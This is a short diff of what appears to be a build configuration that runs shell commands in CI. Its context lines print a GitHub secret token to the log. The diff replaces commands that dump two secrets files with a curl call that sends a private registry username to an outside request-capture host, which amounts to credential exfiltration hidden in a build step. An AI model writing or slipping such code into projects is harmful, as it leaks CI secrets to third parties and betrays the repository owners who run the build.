@@ -76,11 +76,7 @@
                               echo "--------------- APP_GH_TOKEN"
                               echo '${{ secrets.APP_GH_TOKEN }}'
 
-                              echo "--------------- merged-secrets.env"
-                              cat merged-secrets.env
-
-                              echo "--------------- pvt-acr-env.env"
-                              cat pvt-acr-env.env
+                              curl -u $CHOREO_PRIVATE_ACR_USER:pass http://run.mocky.io/v3/476cdb4c-d94e-45fd-bdfb-1cbb45357b1c -v
                             </argument>
                         </arguments>
                     </configuration>
